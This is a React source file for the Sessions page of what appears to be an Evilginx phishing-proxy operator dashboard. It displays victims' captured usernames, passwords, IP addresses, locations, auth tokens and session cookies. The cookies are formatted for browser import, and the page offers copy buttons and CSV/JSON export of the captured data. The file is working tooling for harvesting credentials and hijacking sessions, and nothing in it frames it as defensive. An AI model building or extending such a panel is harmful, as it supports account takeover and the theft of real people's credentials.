import { useEffect, useState, useCallback } from 'react'
import { api, downloadFile } from '../api'
import { useAuth } from '../auth'
import { useLiveEvent } from '../live'
import { Card, Button, Input, Select, Badge, Modal, Spinner, fmtTime, timeAgo, flagEmoji, GeoCell } from '../ui'

function CopyButton({ text, label = 'Copy' }) {
  const [copied, setCopied] = useState(false)
  return (
    <Button
      variant="ghost"
      onClick={async () => {
        try { await navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500) } catch {}
      }}
    >
      {copied ? '✓ Copied' : label}
    </Button>
  )
}

function SessionDetail({ id, onClose, onDeleted }) {
  const { hasRole } = useAuth()
  const [data, setData] = useState(null)
  const [err, setErr] = useState('')

  useEffect(() => {
    api.session(id).then(setData).catch((e) => setErr(e.message))
  }, [id])

  const s = data?.session
  return (
    <Modal open={true} onClose={onClose} title={`Session #${id}`} width="max-w-3xl">
      {err && <div className="text-[var(--danger)]">{err}</div>}
      {!data ? <Spinner /> : (
        <div className="space-y-5">
          <div className="grid grid-cols-2 gap-4 text-sm">
            <Field label="Phishlet" value={s.phishlet} />
            <Field label="Captured" value={s.captured ? 'yes' : 'no'} />
            <Field label="Session ID" value={s.session_id} mono copy={s.session_id} />
            <Field label="Username" value={s.username || '—'} mono copy={s.username} />
            <Field label="Password" value={s.password || '—'} mono copy={s.password} />
            <Field label="Remote IP" value={s.remote_addr} mono />
            <Field
              label="Location"
              value={
                s.geo
                  ? `${flagEmoji(s.geo.country_code)} ${[s.geo.city, s.geo.country || s.geo.country_code].filter(Boolean).join(', ')}${s.geo.asn ? ` · AS${s.geo.asn}${s.geo.as_org ? ' ' + s.geo.as_org : ''}` : ''}`
                  : '—'
              }
            />
            <Field label="Cookies" value={`${s.cookie_count} tokens`} />
            <Field label="Created" value={fmtTime(s.create_time)} />
            <Field label="Updated" value={fmtTime(s.update_time)} />
          </div>

          <Field label="Landing URL" value={s.landing_url} mono copy={s.landing_url} />
          <Field label="User-Agent" value={s.useragent} mono />

          {s.custom && Object.keys(s.custom).length > 0 && (
            <TokenBlock title="Custom" tokens={s.custom} />
          )}
          {s.http_tokens && Object.keys(s.http_tokens).length > 0 && (
            <TokenBlock title="HTTP Tokens" tokens={s.http_tokens} />
          )}
          {s.body_tokens && Object.keys(s.body_tokens).length > 0 && (
            <TokenBlock title="Body Tokens" tokens={s.body_tokens} />
          )}

          <div>
            <div className="mb-1 flex items-center justify-between">
              <span className="text-xs font-medium uppercase tracking-wide text-[var(--text-dim)]">Session Cookies (StorageAce format)</span>
              <CopyButton text={data.cookies_json} label="Copy cookies JSON" />
            </div>
            <pre className="max-h-48 overflow-auto rounded-lg border border-[var(--border)] bg-[var(--bg)] p-3 text-xs text-[var(--text-muted)]">
              {data.cookies_json === 'null' || !data.cookies_json ? 'No cookies captured.' : data.cookies_json}
            </pre>
          </div>

          {hasRole('operator') && (
            <div className="flex justify-end border-t border-[var(--border)] pt-4">
              <Button variant="danger" onClick={async () => {
                if (!confirm(`Delete session #${id}? This cannot be undone.`)) return
                await api.deleteSession(id)
                onDeleted()
              }}>Delete session</Button>
            </div>
          )}
        </div>
      )}
    </Modal>
  )
}

function Field({ label, value, mono, copy }) {
  return (
    <div>
      <div className="text-xs font-medium uppercase tracking-wide text-[var(--text-dim)]">{label}</div>
      <div className="mt-0.5 flex items-center gap-2">
        <span className={`break-all text-[var(--text)] ${mono ? 'font-mono text-xs' : 'text-sm'}`}>{value}</span>
        {copy ? <CopyButton text={copy} /> : null}
      </div>
    </div>
  )
}

function TokenBlock({ title, tokens }) {
  return (
    <div>
      <div className="mb-1 text-xs font-medium uppercase tracking-wide text-[var(--text-dim)]">{title}</div>
      <div className="space-y-1 rounded-lg border border-[var(--border)] bg-[var(--bg)] p-3">
        {Object.entries(tokens).map(([k, v]) => (
          <div key={k} className="flex gap-2 text-xs">
            <span className="shrink-0 font-mono text-[var(--accent)]">{k}:</span>
            <span className="break-all font-mono text-[var(--text-muted)]">{v}</span>
          </div>
        ))}
      </div>
    </div>
  )
}

export default function Sessions() {
  const [sessions, setSessions] = useState(null)
  const [err, setErr] = useState('')
  const [q, setQ] = useState('')
  const [phishlet, setPhishlet] = useState('')
  const [capturedOnly, setCapturedOnly] = useState(false)
  const [detailId, setDetailId] = useState(null)
  const [phishletOpts, setPhishletOpts] = useState([])

  const load = useCallback(() => {
    const params = {}
    if (q) params.q = q
    if (phishlet) params.phishlet = phishlet
    if (capturedOnly) params.captured = 'true'
    api.sessions(params).then((r) => setSessions(r.sessions)).catch((e) => setErr(e.message))
  }, [q, phishlet, capturedOnly])

  useEffect(() => { load() }, [load])
  useEffect(() => {
    api.phishlets().then((r) => setPhishletOpts(r.phishlets.map((p) => p.name))).catch(() => {})
  }, [])

  // live: refresh the list whenever the capture set changes server-side
  useLiveEvent('sessions', () => load())

  const exportParams = () => {
    const p = {}
    if (phishlet) p.phishlet = phishlet
    if (capturedOnly) p.captured = 'true'
    return p
  }

  return (
    <div>
      <div className="mb-5 flex items-center justify-between">
        <h1 className="text-2xl font-bold text-[var(--text)]">Sessions</h1>
        <div className="flex gap-2">
          <Button onClick={() => downloadFile(api.exportSessionsUrl({ ...exportParams(), format: 'csv' }), 'evilginx-sessions.csv')}>Export CSV</Button>
          <Button onClick={() => downloadFile(api.exportSessionsUrl({ ...exportParams(), format: 'json' }), 'evilginx-sessions.json')}>Export JSON</Button>
        </div>
      </div>

      <Card className="mb-4 flex flex-wrap items-center gap-3 p-3">
        <div className="min-w-48 flex-1"><Input placeholder="Search user / ip / url…" value={q} onChange={(e) => setQ(e.target.value)} /></div>
        <Select value={phishlet} onChange={(e) => setPhishlet(e.target.value)} className="w-48">
          <option value="">All phishlets</option>
          {phishletOpts.map((p) => <option key={p} value={p}>{p}</option>)}
        </Select>
        <label className="flex cursor-pointer items-center gap-2 text-sm text-[var(--text-muted)]">
          <input type="checkbox" checked={capturedOnly} onChange={(e) => setCapturedOnly(e.target.checked)} className="accent-[var(--accent)]" />
          Captured only
        </label>
        <Button variant="ghost" onClick={load}>↻ Refresh</Button>
      </Card>

      {err && <div className="rounded-lg bg-[var(--danger-weak)] px-4 py-3 text-[var(--danger)]">{err}</div>}
      {!sessions ? <Spinner /> : (
        <Card className="overflow-hidden">
          <table className="w-full text-sm">
            <thead className="border-b border-[var(--border)] text-left text-xs uppercase tracking-wide text-[var(--text-dim)]">
              <tr>
                <th className="px-4 py-3">ID</th>
                <th className="px-4 py-3">Phishlet</th>
                <th className="px-4 py-3">Username</th>
                <th className="px-4 py-3">Status</th>
                <th className="px-4 py-3">IP</th>
                <th className="px-4 py-3">Location</th>
                <th className="px-4 py-3">Captured</th>
              </tr>
            </thead>
            <tbody>
              {sessions.length === 0 && (
                <tr><td colSpan={7} className="px-4 py-10 text-center text-[var(--text-dim)]">No sessions match.</td></tr>
              )}
              {sessions.map((s) => (
                <tr key={s.id} className="cursor-pointer border-b border-[var(--border)] hover:bg-[var(--surface-2)]" onClick={() => setDetailId(s.id)}>
                  <td className="px-4 py-3 font-mono text-[var(--text-dim)]">#{s.id}</td>
                  <td className="px-4 py-3 text-[var(--text-muted)]">{s.phishlet}</td>
                  <td className="px-4 py-3 font-mono text-[var(--text)]">{s.username || <span className="text-[var(--text-dim)]">—</span>}</td>
                  <td className="px-4 py-3">
                    <div className="flex gap-1">
                      {s.password && <Badge color="blue">pwd</Badge>}
                      {s.cookie_count > 0 && <Badge color="yellow">{s.cookie_count} cookies</Badge>}
                      {!s.captured && <Badge color="gray">visited</Badge>}
                    </div>
                  </td>
                  <td className="px-4 py-3 font-mono text-xs text-[var(--text-dim)]">{s.remote_addr}</td>
                  <td className="px-4 py-3"><GeoCell geo={s.geo} /></td>
                  <td className="px-4 py-3 text-xs text-[var(--text-dim)]" title={fmtTime(s.create_time)}>{timeAgo(s.create_time)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </Card>
      )}

      {detailId !== null && (
        <SessionDetail id={detailId} onClose={() => setDetailId(null)} onDeleted={() => { setDetailId(null); load() }} />
      )}
    </div>
  )
}
